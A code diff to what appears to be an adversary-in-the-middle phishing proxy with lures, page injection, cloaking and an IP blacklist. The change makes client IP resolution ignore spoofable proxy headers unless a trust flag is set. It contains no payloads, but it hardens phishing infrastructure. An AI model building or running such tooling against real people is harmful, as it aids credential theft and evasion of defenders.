@@ -96,6 +96,7 @@ type HttpProxy struct {
 	cloaker           *asncloak.Middleware
 	jsInspector       *jsinspect.Middleware
 	outboundTransport *utlstransport.Transport
+	trustProxyHeaders bool
 }
 
 // CampaignEventSink is the narrow relational boundary used by the proxy. The
@@ -283,17 +284,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			hiblue := color.New(color.FgHiBlue)
 
 			// handle ip blacklist
-			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
-
-			// handle proxy headers
-			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP"}
-			for _, h := range proxyHeaders {
-				origin_ip := req.Header.Get(h)
-				if origin_ip != "" {
-					from_ip = strings.SplitN(origin_ip, ":", 2)[0]
-					break
-				}
-			}
+			//
+			// Client-supplied proxy headers (X-Forwarded-For, etc.) are only
+			// honored when trustProxyHeaders is explicitly enabled (wired from
+			// -cloaker-trust-proxy-headers); otherwise req.RemoteAddr is the
+			// sole source of truth. Trusting these headers unconditionally
+			// lets any client spoof its way past rate limiting and
+			// blacklisting, and worse, lets it poison the persistent
+			// blacklist (below) with an arbitrary attacker-chosen address.
+			// asncloak.ResolveClientIP applies the exact same header
+			// precedence and trust gating the cloaker uses, so the two
+			// subsystems never disagree about who the client is.
+			from_ip := asncloak.ResolveClientIP(req, p.trustProxyHeaders)
 			if allowed, err := p.db.AllowRequest(from_ip, p.rateLimit, p.rateWindow); err != nil {
 				log.Error("rate limit: %v", err)
 			} else if !allowed {
@@ -2125,6 +2127,18 @@ func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
 		body = []byte(head_re.ReplaceAllString(string(body), "<head>\n"+og_inject))
 	}
 	return body
+}
+
+// SetTrustProxyHeaders controls whether the core proxy's client IP
+// resolution (rate limiting, blacklist checks and writes, and the persisted
+// remote_addr) honors client-controlled proxy headers such as
+// X-Forwarded-For. It shares the same trust setting as the cloaker
+// (-cloaker-trust-proxy-headers) rather than a separate flag, so the two
+// subsystems always agree on who the client is. Call it before Start; it is
+// safe to call at any time otherwise since it only flips a bool read per
+// request.
+func (p *HttpProxy) SetTrustProxyHeaders(trust bool) {
+	p.trustProxyHeaders = trust
 }
 
 // ConfigureCloaker installs the request classifier used by an early goproxy
